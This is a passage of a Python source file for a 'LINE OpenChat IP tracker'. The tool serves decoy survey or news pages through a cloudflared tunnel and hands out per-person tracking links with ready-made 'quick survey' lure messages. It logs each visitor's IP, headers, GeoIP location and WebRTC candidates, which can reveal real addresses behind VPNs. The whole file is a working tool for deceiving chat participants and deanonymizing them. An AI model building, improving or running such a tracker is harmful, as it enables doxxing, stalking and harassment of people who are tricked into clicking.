            wr = data.get("webrtc") or {}
            if isinstance(wr, dict) and any(wr.get(x) for x in ("srflx", "host", "relay", "mdns")):
                with LOCK:
                    rec["webrtc"] = wr
                    persist()
                code, label = verify_status(rec)
                out(f"      {col('├ WebRTC:', C.MAG)} {col(json.dumps(wr, ensure_ascii=False), C.MAG)} "
                    f"→ {col('['+label+']', verify_color(code))}")
            return self.send_json({"ok": True})

        if path == "/api/answer":
            ans = {}
            for k in ("q1", "q2", "comment"):
                v = data.get(k)
                if isinstance(v, str) and v.strip():
                    ans[k] = v.strip()[:300]
            if not ans:
                return self.send_json({"ok": False, "error": "empty"}, 400)
            ip = self.client_ip()
            rec = add_hit("answer", tok, ip, self.hdrs(), None)
            with LOCK:
                ans["at"] = now_jst()
                rec.setdefault("answers", []).append(ans)
                persist()
                try:
                    with open(HITS_JSONL, "a", encoding="utf-8") as f:
                        f.write(json.dumps({"type": "answer", "token": tok, "ip": ip,
                                            "answers": ans}, ensure_ascii=False) + "\n")
                except Exception:
                    pass
            print_answer(tok, ip, ans)
            return self.send_json({"ok": True})

        return self.send_text(404, "not found")


# ---------------------------------------------------------------- tunnel
def find_cloudflared() -> str | None:
    for name in ("cloudflared.exe", "cloudflared"):
        p = APP_DIR / name
        if p.exists():
            return str(p)
        w = shutil.which(name)
        if w:
            return w
    return None


def start_tunnel(port: int) -> str:
    global TUNNEL_PROC
    exe = find_cloudflared()
    if not exe:
        print("[!] cloudflared が見つかりません。トンネルなしで起動します。")
        print("    導入: https://github.com/cloudflare/cloudflared/releases から cloudflared.exe を")
        print(f"          このフォルダ ({APP_DIR}) に置くか、PATH に追加してください。")
        return ""
    cmd = [exe, "tunnel", "--no-autoupdate", "--url", f"http://127.0.0.1:{port}"]
    print(f"[*] cloudflared 起動中: {' '.join(cmd)}")
    try:
        TUNNEL_PROC = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, encoding="utf-8", errors="replace", bufsize=1,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0) if os.name == "nt" else 0,
        )
    except Exception as e:
        print(f"[!] cloudflared 起動失敗: {e}")
        return ""

    pat = re.compile(r"https://[a-z0-9][a-z0-9-]*\.trycloudflare\.com")
    found = {"url": ""}

    def reader():
        assert TUNNEL_PROC
        for line in TUNNEL_PROC.stdout:  # type: ignore
            m = pat.search(line)
            if m and not found["url"]:
                found["url"] = m.group(0)
                return

    th = threading.Thread(target=reader, daemon=True)
    th.start()
    th.join(timeout=45)
    if not found["url"]:
        print("[!] 公開URLを取得できませんでした (cloudflared の出力を確認してください)")
        return ""
    return found["url"]


def stop_tunnel():
    if TUNNEL_PROC and TUNNEL_PROC.poll() is None:
        try:
            TUNNEL_PROC.terminate()
        except Exception:
            pass


def write_links(base: str) -> None:
    lines = []
    msg_head = "【オープンチャット】参加者アンケートのお願い"
    for t in CFG["tokens"]:
        url = f"{base}/{t}"
        lines.append(f"token={t}\n  URL: {url}\n  貼り付け用メッセージ:\n"
                     f"  ────────────\n  {msg_head}\n  30秒で終わります。ご協力をお願いします。\n  {url}\n  ────────────\n")
    try:
        LINKS_TXT.write_text("\n".join(lines), encoding="utf-8")
    except Exception:
        pass
    print("\n===== 配布リンク =====")
    for t in CFG["tokens"]:
        print(f"  {col('['+t+']', C.CYN)} {col(base+'/'+t, C.WHT)}")
    print(f"\n貼り付け用の文面は {LINKS_TXT} にも保存しました。\n")


# ---------------------------------------------------------------- main
def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="LINE オープンチャット参加者のIPを特定するツール (追跡リンク方式)"
    )
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--tokens", default="main",
                    help="追跡トークンをカンマ区切り (例: u1,u2,u3)。人数分わけると識別しやすい")
    ap.add_argument("--page", default="survey", choices=["survey", "news", "memo"])
    ap.add_argument("--tunnel", action="store_true", help="cloudflared で公開URLを発行")
    ap.add_argument("--public-url", default="", help="既存トンネルのURLを指定 (例: https://xxx.ngrok-free.app)")
    ap.add_argument("--no-geo", action="store_true", help="GeoIP外部問い合わせを無効化")
    ap.add_argument("--no-color", action="store_true", help="色付き表示を無効化")
    ap.add_argument("--color", action="store_true", help="パイプ実行時でも色を強制")
    ap.add_argument("--open", action="store_true", help="ダッシュボードをブラウザで開く")
    ap.add_argument("--reset", action="store_true", help="過去の記録を消して開始")
    args = ap.parse_args(argv)

    CFG["port"] = args.port
    CFG["page"] = args.page
    CFG["geo"] = not args.no_geo
    CFG["dash_key"] = os.urandom(4).hex()
    toks = [t.strip() for t in args.tokens.split(",") if t.strip()]
    CFG["tokens"] = toks or ["main"]

    use_color = True if args.color else (sys.stdout.isatty() and not args.no_color)
    CFG["color"] = bool(use_color and enable_ansi())

    if args.reset:
        for p in (HITS_JSON, HITS_JSONL):
            try:
                p.unlink()
            except Exception:
                pass
        print("[i] 過去の記録を削除しました")
    load_hits()

    try:
        httpd = ThreadingHTTPServer(("0.0.0.0", CFG["port"]), Handler)
    except OSError as e:
        print(f"[!] ポート {CFG['port']} を開けません: {e}\n    --port 8081 などで指定してください")
        return 1
    httpd.daemon_threads = True

    print("=" * 70)
    print(col(" LINE OpenChat IPトラッカー v1.1", C.B))
    print("=" * 70)
    print(f"  ローカル:   http://127.0.0.1:{CFG['port']}")
    print(f"  LAN:        http://{lan_ip()}:{CFG['port']}")
    print(f"  ダッシュボード: {col('http://127.0.0.1:%d/?k=%s' % (CFG['port'], CFG['dash_key']), C.CYN)}")
    print(f"  GeoIP: {'有効' if CFG['geo'] else '無効'} / ページ: {CFG['page']} / 色: {'有効' if CFG['color'] else '無効'}")
    print(f"  判定: {col('検証OK', C.GRN)} {col('IP相違', C.YEL)} {col('v4/v6', C.CYN)} {col('未検証', C.GRY)} {col('BOT?', C.RED)}")

    base = args.public_url.rstrip("/")
    if args.tunnel and not base:
        base = start_tunnel(CFG["port"])
    if not base:
        base = f"http://{lan_ip()}:{CFG['port']}"
        print("  ※ これは LAN 内のみ有効なURLです。外部(モバイル回線)の相手には --tunnel を使ってください。")
    CFG["public_url"] = base
    write_links(base)

    if args.open:
        threading.Timer(1.0, lambda: webbrowser.open(
            f"http://127.0.0.1:{CFG['port']}/?k={CFG['dash_key']}")).start()

    atexit.register(stop_tunnel)
    print("Ctrl+C で終了します。アクセス待機中...\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[i] 終了します")
    finally:
        stop_tunnel()
        httpd.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
